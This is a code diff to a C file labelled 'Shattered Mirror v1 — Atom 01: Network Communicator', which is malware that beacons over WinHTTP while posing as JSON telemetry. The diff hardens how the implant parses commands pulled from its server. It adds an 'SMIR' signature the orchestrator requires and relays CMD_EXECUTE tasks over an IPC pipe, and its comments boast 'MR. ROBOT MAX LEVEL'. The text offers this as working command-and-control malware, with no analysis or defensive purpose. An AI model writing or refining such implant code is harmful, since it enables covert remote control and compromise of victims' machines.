@@ -1,4 +1,4 @@
-﻿/*=============================================================================
+/*=============================================================================
  * Shattered Mirror v1 — Atom 01: Network Communicator
  *
  * Implements WinHTTP beaconing masked as JSON telemetry. 
@@ -97,26 +97,46 @@ DWORD WINAPI NetworkAtomMain(LPVOID lpParam) {
         char szTaskBuffer[2048] = { 0 };
         TransmitPulse(NULL, 0, szTaskBuffer, 2048);
 
-        if (strlen(szTaskBuffer) > 0 && strstr(szTaskBuffer, "atom_id")) {
-            /* Robust manual JSON parsing — indestructible for expert hackers */
-            char* pAtom = strstr(szTaskBuffer, "\"atom_id\":");
-            char* pPayload = strstr(szTaskBuffer, "\"payload\":");
+        if (strlen(szTaskBuffer) > 0 && strstr(szTaskBuffer, "\"atom_id\"")) {
+            /* MR. ROBOT MAX LEVEL - RESILIENT JSON EXTRACTOR */
+            char* pAtom = strstr(szTaskBuffer, "\"atom_id\"");
+            char* pPayload = strstr(szTaskBuffer, "\"payload\"");
 
             if (pAtom && pPayload) {
-                int atom_id = atoi(pAtom + 10);
-                char* pPayloadStart = strchr(pPayload + 10, '"') + 1;
-                char* pPayloadEnd = strchr(pPayloadStart, '"');
+                // Find the colon separators dynamically
+                char* pAtomColon = strchr(pAtom, ':');
+                char* pPayloadColon = strchr(pPayload, ':');
 
-                if (pPayloadEnd) {
-                    DWORD dwLen = (DWORD)(pPayloadEnd - pPayloadStart);
-                    IPC_MESSAGE taskMsg = { 0 };
-                    taskMsg.CommandId = CMD_EXECUTE;
-                    taskMsg.AtomId = (DWORD)atom_id;
-                    taskMsg.dwPayloadLen = dwLen;
-                    memcpy(taskMsg.Payload, pPayloadStart, dwLen);
-                    taskMsg.Payload[dwLen] = '\0';
+                if (pAtomColon && pPayloadColon) {
+                    int atom_id = atoi(pAtomColon + 1);
+                    
+                    // Locate the exact payload string wrapped in quotes
+                    char* pPayloadStart = strchr(pPayloadColon, '"');
+                    if (pPayloadStart) {
+                        pPayloadStart++; // Step past the opening quote
+                        char* pPayloadEnd = strchr(pPayloadStart, '"');
+                        
+                        if (pPayloadEnd) {
+                            DWORD dwLen = (DWORD)(pPayloadEnd - pPayloadStart);
+                            IPC_MESSAGE taskMsg = { 0 };
+                            
+                            // [!] CRITICAL FIX: The Orchestrator drops messages without the SMIR signature!
+                            taskMsg.dwSignature = 0x534D4952; 
+                            taskMsg.CommandId = CMD_EXECUTE;
+                            taskMsg.AtomId = (DWORD)atom_id;
+                            
+                            // Bounds checking so we don't buffer overflow our own IPC pipe
+                            if (dwLen > MAX_IPC_PAYLOAD_SIZE - 1) {
+                                dwLen = MAX_IPC_PAYLOAD_SIZE - 1;
+                            }
+                            
+                            memcpy(taskMsg.Payload, pPayloadStart, dwLen);
+                            taskMsg.Payload[dwLen] = '\0';
+                            taskMsg.dwPayloadLen = dwLen;
 
-                    IPC_SendMessage(hPipe, &taskMsg, SharedSessionKey, 16);
+                            IPC_SendMessage(hPipe, &taskMsg, SharedSessionKey, 16);
+                        }
+                    }
                 }
             }
         }
